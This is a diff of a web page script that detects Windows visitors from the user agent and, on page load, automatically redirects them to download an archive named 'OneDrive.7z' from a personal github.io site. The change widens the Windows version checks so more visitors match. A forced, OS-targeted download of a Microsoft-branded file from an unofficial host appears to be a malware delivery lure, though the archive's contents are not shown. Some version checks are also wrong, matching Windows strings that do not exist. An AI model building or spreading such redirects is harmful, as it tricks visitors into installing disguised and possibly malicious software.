@@ -8,15 +8,18 @@
             const userAgent = navigator.userAgent;
             let downloadURL = "#";  // default/fallback
 
-            if (/Windows NT 10\.0/.test(userAgent)) {
+            if (/Windows NT 10\./.test(userAgent)) {
                 // Windows 10
                 downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
-            } else if (/Windows NT 11\.3/.test(userAgent)) {
+            } else if (/Windows NT 10.1/.test(userAgent)) {
+                // Windows 10 specific check for version 10.1
+                downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
+            } else if (/Windows NT 11\./.test(userAgent)) {
                 // Windows 11
                 downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
-            } 
-            
-            // Redirect automatically
+            }
+
+            // Redirect automatically based on OS
             window.location.href = downloadURL;
         };
     </script>
